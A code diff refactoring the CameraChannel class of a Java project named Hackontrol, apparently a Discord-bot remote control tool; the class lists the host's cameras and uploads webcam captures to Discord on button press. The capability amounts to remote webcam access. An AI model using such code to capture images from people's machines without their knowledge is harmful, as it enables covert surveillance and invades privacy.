@@ -1,28 +1,28 @@
 package com.khopan.hackontrol.channel;
 
-import java.awt.image.BufferedImage;
 import java.util.ArrayList;
 import java.util.List;
 
 import com.khopan.hackontrol.CameraDevice;
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.NativeLibrary;
-import com.khopan.hackontrol.manager.button.ButtonContext;
-import com.khopan.hackontrol.manager.button.ButtonManager;
-import com.khopan.hackontrol.manager.common.sender.sendable.ISendable;
-import com.khopan.hackontrol.manager.common.sender.sendable.MessageCreateDataSendableListener;
-import com.khopan.hackontrol.manager.modal.ModalContext;
-import com.khopan.hackontrol.manager.modal.ModalManager;
+import com.khopan.hackontrol.manager.interaction.ButtonContext;
+import com.khopan.hackontrol.manager.interaction.ButtonManager;
+import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
+import com.khopan.hackontrol.manager.interaction.InteractionManager;
+import com.khopan.hackontrol.manager.interaction.ModalContext;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolButton;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
 import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
+import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
+import com.khopan.hackontrol.utils.sendable.sender.ReplyCallbackSendable;
 
+import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
-import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
 import net.dv8tion.jda.api.interactions.modals.Modal;
@@ -32,10 +32,10 @@ import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
 public class CameraChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "camera";
 
-	private static final Button BUTTON_CAMERA_LIST = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Camera List", "cameraList");
-	private static final Button BUTTON_SELECT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Select", "selectCamera");
-	private static final Button BUTTON_CAPTURE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Capture", "cameraCapture");
-	private static final Button BUTTON_REFRESH = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Refresh", "refreshCameraList");
+	private static final Button BUTTON_CAMERA_LIST = ButtonManager.staticButton(ButtonType.SUCCESS, "Camera List", "cameraList");
+	private static final Button BUTTON_SELECT      = ButtonManager.staticButton(ButtonType.SUCCESS, "Select",      "selectCamera");
+	private static final Button BUTTON_CAPTURE     = ButtonManager.staticButton(ButtonType.SUCCESS, "Capture",     "cameraCapture");
+	private static final Button BUTTON_REFRESH     = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",     "refreshCameraList");
 
 	private static final String MODAL_SELECT_CAMERA = "selectCamera";
 
@@ -50,11 +50,11 @@ public class CameraChannel extends HackontrolChannel {
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, CameraChannel.BUTTON_CAMERA_LIST, this :: buttonCameraList);
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, CameraChannel.BUTTON_SELECT, this :: buttonSelect);
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, CameraChannel.BUTTON_CAPTURE, this :: buttonCapture);
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, CameraChannel.BUTTON_REFRESH, this :: buttonRefresh);
-		registry.register(ModalManager.MODAL_REGISTRY, CameraChannel.MODAL_SELECT_CAMERA, this :: modalSelectCamera);
+		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_CAMERA_LIST,  this :: buttonCameraList);
+		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_SELECT,       this :: buttonSelect);
+		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_CAPTURE,      this :: buttonCapture);
+		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_REFRESH,      this :: buttonRefresh);
+		registry.register(InteractionManager.MODAL_REGISTRY,  CameraChannel.MODAL_SELECT_CAMERA, this :: modalSelectCamera);
 	}
 
 	@Override
@@ -64,18 +64,18 @@ public class CameraChannel extends HackontrolChannel {
 
 	private void buttonCameraList(ButtonContext context) {
 		this.devices = NativeLibrary.cameraList();
-		this.sendCameraList(context.reply());
+		this.sendCameraList(context);
 	}
 
 	private void buttonSelect(ButtonContext context) {
 		if(this.devices == null || this.devices.length == 0) {
-			HackontrolMessage.deletable(context.reply(), "**No camera available**");
+			HackontrolError.message(context.reply(), "No camera available");
 			return;
 		}
 
 		if(this.devices.length == 1) {
 			this.selectedCamera = this.devices[0];
-			this.sendCameraList(context.reply());
+			this.sendCameraList(context);
 			HackontrolMessage.delete(context);
 			return;
 		} else if(this.devices.length == 2) {
@@ -89,7 +89,7 @@ public class CameraChannel extends HackontrolChannel {
 
 			if(newSelected != null) {
 				this.selectedCamera = newSelected;
-				this.sendCameraList(context.reply());
+				this.sendCameraList(context);
 				HackontrolMessage.delete(context);
 				return;
 			}
@@ -112,20 +112,18 @@ public class CameraChannel extends HackontrolChannel {
 
 	private void buttonCapture(ButtonContext context) {
 		if(this.selectedCamera == null) {
-			HackontrolMessage.deletable(context.reply(), "**No camera selected**");
+			HackontrolError.message(context.reply(), "No camera selected");
 			return;
 		}
 
-
 		TimeSafeReplyHandler.start(context, consumer -> {
 			try {
-				BufferedImage image = this.selectedCamera.capture();
 				MessageCreateBuilder builder = new MessageCreateBuilder();
-				builder.setFiles(ScreenshotChannel.uploadImage(image, "capture"));
+				builder.setFiles(ScreenshotChannel.uploadImage(this.selectedCamera.capture(), "capture"));
 				builder.addActionRow(CameraChannel.BUTTON_CAPTURE, HackontrolButton.delete());
 				consumer.accept(builder.build());
 			} catch(Throwable Errors) {
-				HackontrolError.throwable(MessageCreateDataSendableListener.of(consumer), Errors);
+				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
 			}
 		});
 	}
@@ -136,7 +134,7 @@ public class CameraChannel extends HackontrolChannel {
 	}
 
 	private void modalSelectCamera(ModalContext context) {
-		ModalMapping mapping = context.value("cameraIndex");
+		ModalMapping mapping = context.getValue("cameraIndex");
 
 		if(mapping == null) {
 			HackontrolError.message(context.reply(), "Camera index cannot be null");
@@ -159,13 +157,13 @@ public class CameraChannel extends HackontrolChannel {
 		}
 
 		this.selectedCamera = this.devices[index - 1];
-		this.sendCameraList(context.reply());
+		this.sendCameraList(context);
 		HackontrolMessage.delete(this.selectContext);
 	}
 
-	private void sendCameraList(ISendable sender) {
+	private void sendCameraList(IReplyCallback callback) {
 		if(this.devices == null || this.devices.length == 0) {
-			HackontrolMessage.deletable(sender, "**No camera available**");
+			HackontrolError.message(ReplyCallbackSendable.of(callback), "No camera available");
 			return;
 		}
 
@@ -213,6 +211,6 @@ public class CameraChannel extends HackontrolChannel {
 		}
 
 		list.add(HackontrolButton.delete());
-		sender.send(new MessageCreateBuilder().setContent(builder.toString()).addActionRow(list).build(), ButtonManager :: dynamicButtonCallback);
+		callback.reply(builder.toString()).addActionRow(list).queue(InteractionManager :: callback);
 	}
 }
